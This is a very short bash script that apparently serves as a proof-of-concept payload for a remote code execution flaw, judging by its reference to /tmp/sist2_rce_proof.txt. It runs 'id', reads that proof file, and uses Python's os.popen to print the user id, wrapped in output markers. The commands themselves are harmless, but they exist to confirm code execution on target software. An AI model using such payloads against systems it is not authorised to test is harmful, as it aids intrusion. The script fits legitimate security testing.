#!/bin/bash
echo "===RUN_SH_START==="
id
cat /tmp/sist2_rce_proof.txt 2>/dev/null
python -c 'import os;print("PY",os.getuid(),os.popen("id").read())' 2>&1
echo "===RUN_SH_END==="
